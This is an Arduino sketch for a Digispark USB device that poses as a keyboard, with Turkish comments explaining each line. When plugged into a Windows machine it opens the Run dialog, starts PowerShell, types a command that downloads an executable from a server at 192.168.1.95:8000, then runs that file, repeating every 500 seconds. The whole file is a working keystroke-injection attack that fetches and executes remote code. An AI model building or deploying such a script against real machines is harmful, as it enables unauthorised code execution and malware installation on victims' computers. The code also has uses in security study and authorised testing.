#define kbd_tr_tr
// Bu satır, klavye düzenini Türkçe (Q klavye) olarak ayarlar. Kodun geri kalanında bu klavye düzeni kullanılacaktır.

#include "DigiKeyboard.h"
// Dijital klavye işlevlerini kullanmak için "DigiKeyboard" kütüphanesini içerir.

void setup() {
  // kodun başlangıcında bir şey yapılmasını gerektirmiyor, bu nedenle içi boştur.
}

void loop() { // kodun sürekli olarak çalıştığı yerdir. Aşağıdaki komutlar void setup kısmında ola bilirdi

  DigiKeyboard.sendKeyStroke(0);
  // Herhangi bir tuşa basılmadığını simgeler. Bu, mevcut tuş vuruşlarının temizlenmesine yardımcı olur.

  DigiKeyboard.delay(500);
  //  500 milisaniye (0.5 saniye) boyunca bir gecikme ekler. İşlemler arasında bekleme süreleri sağlar.

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Windows işletim sisteminde "Windows tuşuna basın + R" kombinasyonunu simgeler. Bu, çalıştır penceresini açmak için kullanılır.

  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  // "powershell" metnini yazmaya başlar. PowerShell'i açmak için kullanılır.

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Enter tuşuna basmayı simgeler. PowerShell'i başlatır.

  DigiKeyboard.delay(500);
  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient");
  // Web istemcisi nesnesi oluşturur.

  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);  
  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.1.95:8000/0123456789.exe','0123456789.exe')");
  // PowerShell komut satırına bir dosyanın indirilmesini sağlayan bir komutu yazmaya başlar. Dosya, "http://192.168.1.95:8000/0123456789.exe" adresinden indirilir ve "0123456789.exe" olarak kaydedilir.

  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("exit");
  //  PowerShell penceresini kapatmak için "exit" komutunu yazmaya başlar.

  DigiKeyboard.delay(500);  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("0123456789.exe");
  // "0123456789.exe" adlı bir programı çalıştırmak için yazmaya başlar.

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500000);
  // 500 saniye bekler ve tekrar aynı işlemleri gerçekleştirir
}